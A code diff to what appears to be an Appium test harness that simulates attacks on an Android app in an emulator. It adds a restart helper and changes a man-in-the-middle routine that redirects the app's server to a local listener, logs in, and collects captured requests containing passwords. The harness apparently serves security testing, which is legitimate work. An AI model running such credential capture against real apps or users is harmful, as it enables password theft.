@@ -100,6 +100,20 @@ def genuine_login(ctx):
         ctx["logged_in"] = True
 
 
+def restart_to_login(ctx):
+    """Terminate + relaunch the app so the login screen is showing.
+
+    Genuine mode leaves the app logged in (PostLogin); attacks that need the
+    login screen (MITM, server-IP restore) must restart it first.
+    """
+    driver = ctx.get("driver")
+    if driver is None:
+        return
+    driver.terminate_app(PKG)
+    driver.activate_app(PKG)
+    settle()
+
+
 def settle(sec=2):
     think(sec)
 
@@ -309,13 +323,18 @@ def network_mitm_credential_capture(ctx, rng):
     t = threading.Thread(target=server.serve_forever, daemon=True)
     t.start()
     try:
+        restart_to_login(ctx)  # genuine mode leaves the app on PostLogin, not the login screen
         set_ip_and_port(ctx["driver"], ip="10.0.2.2", port="9999")
         login(ctx["driver"], ctx["user"], ctx["pw"])
         settle(3)
     finally:
         server.shutdown()
         server.server_close()
-        set_ip_and_port(ctx["driver"], ip="10.0.2.2", port="8888")  # restore
+        try:
+            restart_to_login(ctx)  # set_ip_and_port navigates the login screen's menu
+            set_ip_and_port(ctx["driver"], ip="10.0.2.2", port="8888")  # restore
+        except Exception:
+            pass  # cleanup must never kill the batch; the next session force-stops anyway
     leaked = [c for c in _CaptureHandler.captured if "password" in c["body"]]
     return {"attack": "mitm_cleartext_credential_capture",
             "captured_posts": len(_CaptureHandler.captured),
